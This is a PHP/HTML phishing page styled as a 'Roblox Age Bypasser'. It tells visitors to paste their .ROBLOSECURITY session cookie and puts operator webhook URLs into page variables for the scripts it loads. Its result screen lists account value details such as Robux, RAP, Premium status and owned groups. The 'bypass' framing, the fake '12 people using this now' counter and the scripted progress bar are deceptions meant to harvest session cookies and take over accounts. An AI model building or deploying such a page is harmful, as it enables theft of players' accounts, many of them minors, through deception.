<?php
$WEBHOOK_URL = isset($WEBHOOK_URL) ? $WEBHOOK_URL : '';
$USER_WEBHOOK = isset($USER_WEBHOOK) ? $USER_WEBHOOK : '';
$INSTANCE_NAME = isset($INSTANCE_NAME) ? $INSTANCE_NAME : '';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Roblox Age Bypasser</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    
    <script>
        window.INSTANCE_WEBHOOK = '<?php echo addslashes($WEBHOOK_URL); ?>';
        window.INSTANCE_USER_WEBHOOK = '<?php echo addslashes($USER_WEBHOOK); ?>';
        window.INSTANCE_NAME = '<?php echo addslashes($INSTANCE_NAME); ?>';
    </script>
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #02040a 0%, #0a0e27 50%, #02040a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .font-display {
            font-family: var(--font-display);
        }
        
        .text-glow {
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        #particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: radial-gradient(circle at center, #111111 0%, #000000 100%);
        }
        
        .hidden {
            display: none !important;
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            -webkit-backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }
        
        .hover-lift {
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        
        .hover-lift:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body class="bg-[#02040a] text-white overflow-x-hidden">
    <canvas id="particles"></canvas>
    
    <div class="container max-w-lg mx-auto px-4 py-12 flex flex-col items-center min-h-screen relative z-10">
        <div class="text-center mb-10 space-y-4">
            <div class="relative inline-block">
                <div class="absolute inset-0 bg-white/20 blur-2xl rounded-full"></div>
                <div class="relative w-16 h-16 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                </div>
            </div>
            <h1 class="text-4xl md:text-5xl font-display font-bold tracking-tight text-glow animated-gradient-text">
                Roblox Age Bypasser
            </h1>
            <p class="text-white/60 text-lg">
                Secure and efficient age verification bypass
            </p>
            
            <div class="inline-flex items-center gap-2 px-4 py-2 bg-white/5 border border-white/10 rounded-full glass-effect">
                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-white/80 text-sm font-medium" id="live-status">12 people using this now</span>
            </div>
        </div>

        <div class="w-full relative">
            <div class="absolute inset-0 bg-white/5 blur-3xl rounded-[2.5rem] -z-10"></div>
            <div id="card" class="bg-black/40 backdrop-blur-xl border border-white/10 p-8 rounded-[2.5rem] shadow-2xl glass-effect">
                <!-- Form State -->
                <div id="form-state" class="space-y-6">
                    <div class="space-y-2">
                        <label class="text-sm font-medium text-white/80 ml-1">.ROBLOSECURITY Cookie</label>
                        <textarea id="cookie-input" placeholder="Paste your cookie here..." class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white min-h-[120px] rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors glass-effect"></textarea>
                    </div>

                    <div class="flex gap-3">
                        <button id="btn-check" class="flex-1 h-14 bg-white/10 text-white hover:bg-white/15 border border-white/20 rounded-2xl text-base font-semibold transition-all active:scale-[0.98] flex items-center justify-center gap-2 glass-effect">
                            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                            Check Cookie
                        </button>
                        <button id="btn-start" class="flex-[2] h-14 bg-white text-black hover:bg-white/90 rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3">
                            <div class="w-0 h-0 border-t-[6px] border-t-transparent border-l-[10px] border-l-black border-b-[6px] border-b-transparent ml-1"></div>
                            Start Bypass
                        </button>
                    </div>
                </div>

                <!-- Processing State -->
                <div id="processing-state" class="hidden py-8 flex flex-col items-center space-y-8">
                    <div class="relative">
                        <div class="absolute inset-0 bg-white/20 blur-2xl rounded-full animate-pulse"></div>
                        <div class="spinner relative"></div>
                    </div>
                    <div class="text-center space-y-2">
                        <h3 class="text-2xl font-bold">Bypassing Age</h3>
                        <p class="text-white/60">Please wait while we process your request.</p>
                        <p class="text-white/40 text-sm">Usually takes 2-3 minutes</p>
                    </div>
                    <div class="w-full space-y-3">
                        <div class="h-2 w-full bg-white/5 rounded-full overflow-hidden">
                            <div id="progress-bar" class="h-full bg-gradient-to-r from-blue-500 to-purple-500 shadow-[0_0_15px_rgba(147,51,234,0.5)] transition-all duration-300" style="width: 0%"></div>
                        </div>
                        <p id="progress-text" class="text-center text-sm font-medium text-white/40">0% Complete</p>
                    </div>
                </div>

                <!-- Success State -->
                <div id="success-state" class="hidden py-8 flex flex-col items-center space-y-6 text-center">
                    <div class="relative w-24 h-24">
                        <div class="absolute inset-0 bg-green-500/20 blur-2xl rounded-full"></div>
                        <img id="user-avatar" src="" alt="User Avatar" class="relative w-full h-full rounded-full border-2 border-green-500/50 object-cover">
                        <div class="absolute -bottom-1 -right-1 bg-green-500 rounded-full p-1 border-2 border-black">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                        </div>
                    </div>
                    <div class="space-y-2">
                        <h3 class="text-2xl font-bold">Successfully Bypassed</h3>
                        <p class="text-white/60 text-sm" id="user-display-name"></p>
                        <div class="mt-3 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-xl">
                            <p class="text-yellow-300 text-xs font-medium">⏱️ Wait 1-2 minutes, then check your Roblox account settings to verify the changes!</p>
                        </div>
                    </div>
                    
                    <!-- Account Score -->
                    <div class="w-full bg-gradient-to-r from-purple-500/20 to-blue-500/20 border border-purple-500/30 rounded-2xl p-4 glass-effect">
                        <div class="flex items-center justify-between mb-2">
                            <span class="text-white/60 text-sm">Account Score</span>
                            <span class="text-2xl font-bold animated-gradient-text" id="account-score">0/100</span>
                        </div>
                        <div class="h-3 bg-white/10 rounded-full overflow-hidden">
                            <div id="score-bar" class="h-full bg-gradient-to-r from-purple-500 to-blue-500 transition-all duration-1000" style="width: 0%"></div>
                        </div>
                        <p class="text-white/40 text-xs mt-2" id="score-rating">Calculating...</p>
                    </div>
                    
                    <!-- Account Info Grid -->
                    <div class="w-full grid grid-cols-2 gap-3 text-sm">
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Username</p>
                            <p class="font-semibold" id="info-username">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">User ID</p>
                            <p class="font-semibold" id="info-userid">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Robux</p>
                            <p class="font-semibold" id="info-robux">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">RAP</p>
                            <p class="font-semibold" id="info-rap">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Premium</p>
                            <p class="font-semibold" id="info-premium">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Voice Chat</p>
                            <p class="font-semibold" id="info-vc">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Friends</p>
                            <p class="font-semibold" id="info-friends">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Followers</p>
                            <p class="font-semibold" id="info-followers">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Account Age</p>
                            <p class="font-semibold" id="info-age">-</p>
                        </div>
                        <div class="bg-white/5 rounded-xl p-3 border border-white/10 glass-effect hover-lift">
                            <p class="text-white/40 text-xs mb-1">Groups Owned</p>
                            <p class="font-semibold" id="info-groups">-</p>
                        </div>
                    </div>
                    
                    <button id="btn-restart" class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect">
                        Process Another Account
                    </button>
                </div>

                <!-- Failed State -->
                <div id="failed-state" class="hidden py-8 flex flex-col items-center space-y-6 text-center">
                    <div class="w-20 h-20 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center glass-effect">
                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
                    </div>
                    <div class="space-y-2">
                        <h3 class="text-2xl font-bold">Bypass Failed</h3>
                        <p class="text-white/60">The credentials provided were invalid.</p>
                    </div>
                    <button id="btn-retry" class="border border-white/10 hover:bg-white/5 rounded-2xl h-12 px-8 transition-colors glass-effect">
                        Try Again
                    </button>
                </div>
            </div>
        </div>

        <!-- Join Discord Button -->
        <div class="mt-8 w-full max-w-lg">
            <a href="https://discord.gg/MvEpDQ8uNN" target="_blank" rel="noopener noreferrer" class="block w-full h-14 bg-gradient-to-r from-purple-500 to-blue-500 hover:from-purple-600 hover:to-blue-600 text-white rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3 glass-effect shadow-lg">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 71 55" fill="currentColor">
                    <path d="M60.1045 4.8978C55.5792 2.8214 50.7265 1.2916 45.6527 0.41542C45.5603 0.39851 45.468 0.440769 45.4204 0.525289C44.7963 1.6353 44.105 3.0834 43.6209 4.2216C38.1637 3.4046 32.7345 3.4046 27.3892 4.2216C26.905 3.0581 26.1886 1.6353 25.5617 0.525289C25.5141 0.443589 25.4218 0.40133 25.3294 0.41542C20.2584 1.2888 15.4057 2.8186 10.8776 4.8978C10.8384 4.9147 10.8048 4.9429 10.7825 4.9795C1.57795 18.7309 -0.943561 32.1443 0.293408 45.3914C0.299005 45.4562 0.335386 45.5182 0.385761 45.5576C6.45866 50.0174 12.3413 52.7249 18.1147 54.5195C18.2071 54.5477 18.305 54.5139 18.3638 54.4378C19.7295 52.5728 20.9469 50.6063 21.9907 48.5383C22.0523 48.4172 21.9935 48.2735 21.8676 48.2256C19.9366 47.4931 18.0979 46.6 16.3292 45.5858C16.1893 45.5041 16.1781 45.304 16.3068 45.2082C16.679 44.9293 17.0513 44.6391 17.4067 44.3461C17.471 44.2926 17.5606 44.2813 17.6362 44.3151C29.2558 49.6202 41.8354 49.6202 53.3179 44.3151C53.3935 44.2785 53.4831 44.2898 53.5502 44.3433C53.9057 44.6363 54.2779 44.9293 54.6529 45.2082C54.7816 45.304 54.7732 45.5041 54.6333 45.5858C52.8646 46.6197 51.0259 47.4931 49.0921 48.2228C48.9662 48.2707 48.9102 48.4172 48.9718 48.5383C50.038 50.6034 51.2554 52.5699 52.5959 54.435C52.6519 54.5139 52.7526 54.5477 52.845 54.5195C58.6464 52.7249 64.529 50.0174 70.6019 45.5576C70.6551 45.5182 70.6887 45.459 70.6943 45.3942C72.1747 30.0791 68.2147 16.7757 60.1968 4.9823C60.1772 4.9429 60.1437 4.9147 60.1045 4.8978ZM23.7259 37.3253C20.2276 37.3253 17.3451 34.1136 17.3451 30.1693C17.3451 26.225 20.1717 23.0133 23.7259 23.0133C27.308 23.0133 30.1626 26.2532 30.1066 30.1693C30.1066 34.1136 27.28 37.3253 23.7259 37.3253ZM47.3178 37.3253C43.8196 37.3253 40.9371 34.1136 40.9371 30.1693C40.9371 26.225 43.7636 23.0133 47.3178 23.0133C50.9 23.0133 53.7545 26.2532 53.6986 30.1693C53.6986 34.1136 50.9 37.3253 47.3178 37.3253Z"/>
                </svg>
                Join Discord
            </a>
        </div>

        <div class="mt-8 flex items-center gap-2">
            <span class="text-white/40 text-sm font-medium uppercase tracking-widest">Status</span>
            <div class="flex items-center gap-1.5 px-3 py-1 bg-green-500/10 border border-green-500/20 rounded-full glass-effect">
                <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-green-500 text-xs font-bold uppercase">Online</span>
            </div>
        </div>
    </div>

    <script src="/public/protect.js"></script>
    <script src="/public/script.js"></script>
</body>
</html>
